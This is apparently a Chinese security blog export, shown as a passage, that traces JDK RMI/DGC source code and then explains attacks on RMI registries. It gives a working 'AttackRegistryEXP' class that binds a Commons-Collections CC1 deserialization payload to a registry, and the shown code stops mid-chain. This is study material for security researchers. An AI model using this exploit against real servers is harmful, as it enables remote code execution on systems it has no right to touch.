clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var5);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var6);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们的想法是找一个地方去调用Util.createProxy创建一个动态代理类，我们找到的是DGC这个类可以被利用，然后调用它的clean或者dirty方法去触发他的invoke方法</p>
<p>我们直接走向最终找到的DGCClient内部类EndpointEntry的构造方法方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(<span class="keyword">final</span> Endpoint endpoint)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = endpoint;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">dgcRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, endpoint, <span class="literal">false</span>);</span><br><span class="line">                dgc = (DGC) Util.createProxy(DGCImpl.class,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(dgcRef), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            renewCleanThread =  AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(),</span><br><span class="line">                                    <span class="string">&quot;RenewClean-&quot;</span> + endpoint, <span class="literal">true</span>));</span><br><span class="line">            renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们找哪里去创建了这么一个类，在EndpointEntry中的lookup方法中创建了这么一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> EndpointEntry <span class="title function_">lookup</span><span class="params">(Endpoint ep)</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (endpointTable) &#123;</span><br><span class="line">                <span class="type">EndpointEntry</span> <span class="variable">entry</span> <span class="operator">=</span> endpointTable.get(ep);</span><br><span class="line">                <span class="keyword">if</span> (entry == <span class="literal">null</span>) &#123;</span><br><span class="line">                    entry = <span class="keyword">new</span> <span class="title class_">EndpointEntry</span>(ep);</span><br><span class="line">                    endpointTable.put(ep, entry);</span><br><span class="line">                    <span class="keyword">if</span> (gcLatencyRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">                        gcLatencyRequest = GC.requestLatency(gcInterval);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> entry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>我们看只有在registerRefs中调用了lookup方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">(Endpoint ep, List&lt;LiveRef&gt; refs)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up the given endpoint and register the refs with it.</span></span><br><span class="line"><span class="comment">         * The retrieved entry may get removed from the global endpoint</span></span><br><span class="line"><span class="comment">         * table before EndpointEntry.registerRefs() is able to acquire</span></span><br><span class="line"><span class="comment">         * its lock; in this event, it returns false, and we loop and</span></span><br><span class="line"><span class="comment">         * try again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        EndpointEntry epEntry;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            epEntry = EndpointEntry.lookup(ep);</span><br><span class="line">        &#125; <span class="keyword">while</span> (!epEntry.registerRefs(refs));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要找到一个反序列化利用的点，在向上找，会找到两个调用registerRefs的方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735285463617-0b135f12-f4cb-4beb-ae5b-b34cccb701c5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735285463617-0b135f12-f4cb-4beb-ae5b-b34cccb701c5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们看read方法中，如果这个输入流不是并且不继承于ConnectionInputStream的话，就会调用我们的registerRefs方法，但是这个in是一个ConnectionInputStream，所以我们只能去找另一个方法去利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>另一个最终的流程是releaseInputStream去调用StreamRemoteCall.registerRefs然后进入到if中（这个判断条件中的incomingRefTable是为空的，我们后续会说怎么走到if里面）调用DGCClient.registerRefs</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">releaseInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in.done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                in.registerRefs();</span><br><span class="line">                in.done(conn);</span><br><span class="line">            &#125;</span><br><span class="line">            conn.releaseInputStream();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            in = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后调用releaseInputStream的地方就是非常的多了，在许多Skel中都有调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286130718-449e3a84-5bfa-4b08-84a0-611bf046ed26.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286130718-449e3a84-5bfa-4b08-84a0-611bf046ed26.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后的流程如下，只要调用releaseInputStream，就会创建一个proxy对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286703216-1104471b-868f-418d-b2a7-0abdf6e93cbf.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286703216-1104471b-868f-418d-b2a7-0abdf6e93cbf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><strong>实际上反序列化流程，只是为了给incomingRefTable赋值，攻击流程实际是在正常的调用流程中</strong></p>
<p>我们上面说过，这里的值默认是空的，要想走入DGCClient.registerRefs中，我们就应该去找，哪里给incomingRefTable赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实际这里只有一个地方ConnectionInputStream的saveRef中，向里面put进去了一个东西，使他不为空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">saveRef</span><span class="params">(LiveRef ref)</span> &#123;</span><br><span class="line"><span class="type">Endpoint</span> <span class="variable">ep</span> <span class="operator">=</span> ref.getEndpoint();</span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether endpoint is already in the hashtable</span></span><br><span class="line">List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (refList == <span class="literal">null</span>) &#123;</span><br><span class="line">    refList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;LiveRef&gt;();</span><br><span class="line">    incomingRefTable.put(ep, refList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add ref to list of refs for endpoint ep</span></span><br><span class="line">refList.add(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>saveRef也是只有一个地方去调用，就是read方法，我们之前讨论过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput in, <span class="type">boolean</span> useNewFormat)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看看谁调用了read方法，只有UnicastRef和UnicastRef2中的readExternal去调用了read方法</p>
<p>readExternal是一个和readObject类似但不一样的东西，如果所反序列化的类，也有readExternal方法，也会去调用readExternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ref = LiveRef.read(in, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>UnicastRef是白名单里面的内容，我们向客户端传入一个UnicastRef对象触发它的readexternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到LiveRef.read中… 剩下的调用我们就不再重复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput var0, <span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">if</span> (var0 <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> (ConnectionInputStream)var0;</span><br><span class="line">            var6.saveRef(var5);</span><br><span class="line">            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                var6.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>后续会走到EndpointEntry中，在创建完dgc后会走到下面创建一个RenewCleanThread线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(Endpoint var1)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = var1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(DGCClient.dgcID, var1, <span class="literal">false</span>);</span><br><span class="line">                <span class="built_in">this</span>.dgc = (DGC)Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(var2), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread = (Thread)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(), <span class="string">&quot;RenewClean-&quot;</span> + var1, <span class="literal">true</span>));</span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>RenewCleanThread中，会调用DGCClient的makeDirtyCall方法，而这个方法最终会调用他的dirty方法，就会调用到invoke方法，最终让服务器发送客户端请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeDirtyCall(var5, var6);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!EndpointEntry.<span class="built_in">this</span>.pendingCleans.isEmpty()) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeCleanCalls();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI攻击方式</title>
    <url>/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<h1 id="hBAI6">RMI攻击方式</h1>
前面我们进行了RMI源码层面的分析，这里我们来讨论RMI的攻击方式

<h2 id="SX5Zl">RMI攻击基本方式</h2>
根据源码层面分析，我们有以下几种基本攻击方式

<ul>
<li>客户端 打 注册中心</li>
<li>客户端 打 服务端</li>
<li>客户端</li>
</ul>
<h3 id="DBnm2">攻击注册中心</h3>
不管是服务端或者客户端，与注册中心交互主要是下面这句话

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br></pre></td></tr></table></figure>

<p>除了<code>bind</code>方法，还有其他方式</p>
<p>以下方法位于<code>RegistryImpl_Skel#dispatch</code>中，下面是交互方法和其与<code>dispatch</code>的对应关系</p>
<ul>
<li>0 —- bind</li>
<li>1 —- list</li>
<li>2 —- lookup</li>
<li>3 —- rebind</li>
<li>4 —- unbind</li>
</ul>
<p>tips：除了list和lookup两者，剩下方法在8u121后，均需要在localhost调用</p>
<h4 id="xJpr6">List鸡肋攻击</h4>

<p><code>list</code>方法可以列出目标上绑定的所有对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegistryListAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] list = Naming.list(<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行的时候，会将绑定对象的信息打印出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741174218752-e6d632a9-7ec8-4a28-adba-2cd3458fbdc6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741174218752-e6d632a9-7ec8-4a28-adba-2cd3458fbdc6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>从上面得知该方法对应case1，其代码如下</p>
<p>里面只存在着<code>writeObject</code>方法，并没有反序列化的入口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            var2.releaseInputStream();</span><br><span class="line">            String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                var98.writeObject(var97);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h4 id="eP5jE">bind/rebind攻击</h4>
我们知道，这两者对应的case分别为0，3

<p>其源码如下，两个方法中都是存在反序列化的，反序列化的东西均为 <strong>一个参数名和一个远程对象</strong></p>
<p>这两者的均可以作为反序列化的入口类，若该服务端导入了CC的依赖，我们就可以利用这里的反序列化入口，进行CC链的反序列化攻击</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>我这里在服务端导入<code>3.2.1</code>版本的CC依赖，尝试去打它的CC1这条链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>远程对象在两者间传递时，是传递的<code>Proxy</code>动态代理对象，而绑定时需要<code>Remote</code>类型的对象</p>
<p>因此在绑定时，我们需要一个实现 <code>Remote</code> 接口的动态代理对象</p>
<p>这里有一个<code>newProxyInstance</code>方法，可以创建动态代理，需要<code>InvocationHandler</code>示例，所有我们需要将恶意类转为<code>InvocationHandler</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                          InvocationHandler h)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">                checkNewProxyPermission(Reflection.getCallerClass(), cl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">ih</span> <span class="operator">=</span> h;</span><br><span class="line">            <span class="keyword">if</span> (!Modifier.isPublic(cl.getModifiers())) &#123;</span><br><span class="line">                AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;h&#125;);</span><br><span class="line">        &#125; ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面就是我们的封装代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();  </span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(  </span><br><span class="line">       Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));  </span><br><span class="line">registry.bind(<span class="string">&quot;test&quot;</span>,remote);  </span><br></pre></td></tr></table></figure>

<p>EXP 如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);  </span><br><span class="line">         <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();  </span><br><span class="line">         <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(  </span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));  </span><br><span class="line">         registry.bind(<span class="string">&quot;test&quot;</span>,remote);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数  </span></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span 